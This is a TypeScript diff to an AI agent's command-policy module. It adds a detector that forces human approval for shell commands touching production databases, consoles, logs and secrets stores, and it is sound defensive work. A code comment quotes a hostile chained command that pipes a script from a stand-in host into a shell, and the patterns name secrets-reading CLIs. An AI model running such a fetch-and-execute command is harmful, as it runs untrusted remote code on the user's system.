@@ -28,7 +28,17 @@ export interface PolicyDecision {
    * On `allow`: a short description (used only for audit/progress).
    */
   reason: string;
+  /**
+   * A named policy concern that raises the stakes of an otherwise-ordinary gate
+   * (M3). `"production-data"` means the call looks like it investigates
+   * production data (DESIGN §4): gated like a build even though it may be
+   * read-only, never auto-allowlistable, and surfaced on the approval so the
+   * architect knows in-thread results must be aggregates only.
+   */
+  concern?: PolicyConcern;
 }
+
+export type PolicyConcern = "production-data";
 
 export interface PolicyContext {
   /** Absolute session worktree; filesystem access is confined to it. */
@@ -47,7 +57,7 @@ const NETWORK_TOOLS = new Set(["WebFetch", "WebSearch"]);
 const PATH_FIELDS = ["file_path", "path", "notebook_path"] as const;
 
 const allow = (reason: string): PolicyDecision => ({ action: "allow", reason });
-const gate = (reason: string): PolicyDecision => ({ action: "gate", reason });
+const gate = (reason: string, concern?: PolicyConcern): PolicyDecision => ({ action: "gate", reason, concern });
 const deny = (reason: string): PolicyDecision => ({ action: "deny", reason });
 
 /**
@@ -126,12 +136,56 @@ function evaluateBash(input: unknown, ctx: PolicyContext): PolicyDecision {
   const danger = bashHardDeny(command);
   if (danger) return deny(danger);
 
+  // Production-data investigation is gated like a build (DESIGN §4) even though
+  // it may be read-only, and it can NEVER be auto-allowlisted away — so this
+  // check sits BEFORE the allowlist. "anyone can ask + the answer lands in
+  // Slack" would otherwise turn the agent into a bypass around the app's own
+  // data-access controls.
+  if (productionDataConcern(command)) {
+    return gate(`run \`${truncate(command)}\` (investigates production data)`, "production-data");
+  }
+
   // Auto-allow only when EVERY chained segment is individually allowlisted, so
   // `git status && curl evil.sh | sh` can never ride in on `git status`.
   if (bashFullyAllowlisted(command, ctx.safeBashAllowlist)) {
     return allow(`run \`${truncate(command)}\``);
   }
   return gate(`run \`${truncate(command)}\``);
+}
+
+/**
+ * Does this command look like it investigates PRODUCTION data (DESIGN §4,
+ * Appendix A3)? High-signal, deliberately conservative — database clients, app
+ * consoles, cloud/infra data & log CLIs. A match forces a gate that can't be
+ * allowlisted away; it is NOT a hard-deny (an architect may legitimately
+ * approve one), and results posted in-thread must be aggregates only. Not
+ * exhaustive: the human at the gate is the real net; this catches the sharpest,
+ * most common shapes so they never slip through as auto-allowed.
+ */
+export function productionDataConcern(command: string): boolean {
+  for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
+    const seg = rawSeg.trim();
+    // Match on the invoked program (first token, allowing leading paths like
+    // `bin/rails` or `./manage.py`), not on an argument that merely mentions it.
+    const first = seg.split(/\s+/)[0] ?? "";
+    const prog = first.replace(/^.*\//, ""); // strip any path prefix
+    const rest = seg.slice(first.length);
+    // Direct database / cache / search clients.
+    if (/^(psql|mysql|mysqldump|mongo|mongosh|redis-cli|clickhouse-client|cqlsh|influx|mongoexport|pg_dump)$/.test(prog)) return true;
+    // App consoles / runners that reach the live datastore.
+    if (/^(rails)$/.test(prog) && /\b(c|console|dbconsole|runner)\b/.test(rest)) return true;
+    if (/^(rails)$/.test(prog) && rest.trim() === "") return true;
+    if (/^(django-admin)$/.test(prog) && /\b(shell|dbshell|shell_plus)\b/.test(rest)) return true;
+    // manage.py may be run via an interpreter (`python manage.py shell`), so
+    // match it anywhere in the segment rather than only as the first token.
+    if (/(?:^|[\s\/])manage\.py\s+(shell|dbshell|shell_plus)\b/.test(seg)) return true;
+    if (/^(heroku|flyctl|fly|doctl|kubectl|wrangler)$/.test(prog) && /\b(run|console|logs|exec|db|psql|proxy)\b/.test(rest)) return true;
+    // Cloud data & log services (read of prod data / logs).
+    if (/^aws$/.test(prog) && /\b(s3|rds|dynamodb|logs|athena|redshift|secretsmanager|ssm)\b/.test(rest)) return true;
+    if (/^(gcloud|bq|gsutil)$/.test(prog) && /\b(sql|logging|logs|bigquery|storage|secrets)\b/.test(rest)) return true;
+    if (/^az$/.test(prog) && /\b(sql|cosmosdb|storage|monitor|keyvault)\b/.test(rest)) return true;
+  }
+  return false;
 }
 
 /**
